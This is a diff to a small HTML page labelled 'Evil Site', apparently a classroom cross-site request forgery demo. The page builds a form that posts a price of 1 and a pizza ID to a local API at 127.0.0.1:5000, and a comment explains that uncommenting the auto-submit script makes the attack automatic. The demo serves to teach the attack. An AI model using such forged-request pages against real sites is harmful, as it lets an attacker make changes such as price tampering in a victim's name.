@@ -4,19 +4,21 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>GET</title>
+    <title>CSRF</title>
   </head>
   <body>
     <h1>Evil Site</h1>
     <h2>I will hack you</h2>
-
-    <form id="form" action="/" method="POST">
-      <input type="text" value="id" />
-      <input type="text" value="price" />
-      <input type="submit" value="Click Me!" />
+    <!-- change port if server starts on another one -->
+    <form action="http://127.0.0.1:5000/api" method="POST">
+      <code>Price: </code><input type="text" name="price" id="price" value="1"><br />
+      <code>Pizza ID: </code><input type="text" name="id" id="id" value="p2">
+      <input type="submit" value="submit">
+      
     </form>
 
     <!-- 
+    Remove this comment to make the attack automated (as it should be)
     <script>document.forms[0].submit()</script> 
     -->
 
